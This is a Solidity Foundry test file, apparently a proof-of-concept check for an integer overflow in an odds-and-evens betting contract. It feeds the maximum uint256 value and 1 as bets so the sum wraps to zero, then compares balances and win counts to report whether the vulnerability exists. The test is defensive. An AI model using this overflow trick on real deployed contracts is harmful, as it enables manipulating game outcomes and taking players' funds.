// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/odds_and_evens.sol";

contract OddsAndEvensOverflowTest is Test {
    OddsAndEvens game;
    address player1 = address(0x100);
    address player2 = address(0x101);
    uint256 constant BET_AMOUNT = 1 ether;
    
    // State variables for differential checks
    uint256 player1BalanceBefore;
    uint256 player2BalanceBefore;
    uint256 player1WinsBefore;
    uint256 player2WinsBefore;
    uint256 totalGamesBefore;
    uint256 totalWinnersBefore;
    
    uint256 player1BalanceAfter;
    uint256 player2BalanceAfter;
    uint256 player1WinsAfter;
    uint256 player2WinsAfter;
    uint256 totalGamesAfter;
    uint256 totalWinnersAfter;

    event WinnerDeclared(address winner, uint256 amount);

    function setUp() public {
        game = new OddsAndEvens();
        vm.deal(player1, 100 ether);
        vm.deal(player2, 100 ether);
    }

    function testIntegerOverflowCausesIncorrectWinner() public {
        // ================== BEGIN DIFFERENTIAL CHECKS ==================
        console.log("--- BEFORE-Trigger Game Plays ---");
        // Record pre-trigger state
        player1BalanceBefore = player1.balance;
        player2BalanceBefore = player2.balance;
        (player1WinsBefore, ) = game.getPlayerStats(player1);
        (player2WinsBefore, ) = game.getPlayerStats(player2);
        totalGamesBefore = game.totalGames();
        totalWinnersBefore = game.totalWinners();
        
        console.log("Player1 Balance Before:", player1BalanceBefore);
        console.log("Player2 Balance Before:", player2BalanceBefore);
        console.log("Player1 Wins Before:", player1WinsBefore);
        console.log("Player2 Wins Before:", player2WinsBefore);
        console.log("Total Games Before:", totalGamesBefore);
        console.log("Total Winners Before:", totalWinnersBefore);

        console.log("--- Trigger Overflow Attack ---");
        // Player1: Max uint256 (odd number on overflow)
        uint256 maxUint = type(uint256).max;
        vm.prank(player1);
        game.play{value: BET_AMOUNT}(maxUint);

        // Player2: 1 (making the sum 0 after overflow)
        vm.prank(player2);
        game.play{value: BET_AMOUNT}(1);

        console.log("--- AFTER-Trigger Game Plays ---");
        // Record post-trigger state
        player1BalanceAfter = player1.balance;
        player2BalanceAfter = player2.balance;
        (player1WinsAfter, ) = game.getPlayerStats(player1);
        (player2WinsAfter, ) = game.getPlayerStats(player2);
        totalGamesAfter = game.totalGames();
        totalWinnersAfter = game.totalWinners();
        
        console.log("Player1 Balance After:", player1BalanceAfter);
        console.log("Player2 Balance After:", player2BalanceAfter);
        console.log("Player1 Wins After:", player1WinsAfter);
        console.log("Player2 Wins After:", player2WinsAfter);
        console.log("Total Games After:", totalGamesAfter);
        console.log("Total Winners After:", totalWinnersAfter);

        console.log("--- Differential Comparison ---");
        // Calculate actual changes
        int256 player1BalanceDelta = int256(player1BalanceAfter) - int256(player1BalanceBefore);
        int256 player2BalanceDelta = int256(player2BalanceAfter) - int256(player2BalanceBefore);
        uint256 totalWinnersDelta = totalWinnersAfter - totalWinnersBefore;
        uint256 totalGamesDelta = totalGamesAfter - totalGamesBefore;
        
        // Theoretical expected changes without vulnerability
        int256 expectedP1Delta = (player1WinsAfter > player1WinsBefore) ? 
                                  int256(0.8 ether) : 
                                  -int256(BET_AMOUNT);
        
        int256 expectedP2Delta = (player2WinsAfter > player2WinsBefore) ? 
                                  int256(0.8 ether) : 
                                  -int256(BET_AMOUNT);
        
        console.log("Player1 Actual Delta:", uint256(player1BalanceDelta));
        console.log("Player1 Expected Delta:", uint256(expectedP1Delta));
        console.log("Player2 Actual Delta:", uint256(player2BalanceDelta));
        console.log("Player2 Expected Delta:", uint256(expectedP2Delta));
        console.log("Total Winners Delta:", totalWinnersDelta);
        console.log("Total Games Delta:", totalGamesDelta);

        // Vulnerability detection logic
        bool imbalanceDetected = false;
        string memory reason;
        
        // Check winner consistency with prize distribution
        if ((player1WinsAfter > player1WinsBefore) && 
            (player1BalanceDelta != expectedP1Delta)) {
            imbalanceDetected = true;
            reason = "Player1 recorded win but incorrect prize distribution";
        }
        
        if ((player2WinsAfter > player2WinsBefore) && 
            (player2BalanceDelta != expectedP2Delta)) {
            imbalanceDetected = true;
            reason = "Player2 recorded win but incorrect prize distribution";
        }
        
        // Check unexpected winner patterns
        if ((player1WinsAfter == player1WinsBefore) && 
            (player2WinsAfter == player2WinsBefore) &&
            (totalWinnersDelta > 0)) {
            imbalanceDetected = true;
            reason = "Wins unchanged but total winners increased";
        }
        
        // Check game accounting
        if (totalWinnersDelta != 1 || totalGamesDelta != 1) {
            imbalanceDetected = true;
            reason = "Game accounting mismatch after overflow";
        }

        // Final vulnerability verdict
        string memory verdict;
        if (imbalanceDetected) {
            verdict = string(abi.encodePacked("Vulnerability Exists: ", reason));
        } else {
            verdict = "Vulnerability not Exist: No accounting anomalies detected";
        }
        console.log(verdict);
        // ================== END DIFFERENTIAL CHECKS ==================
    }
}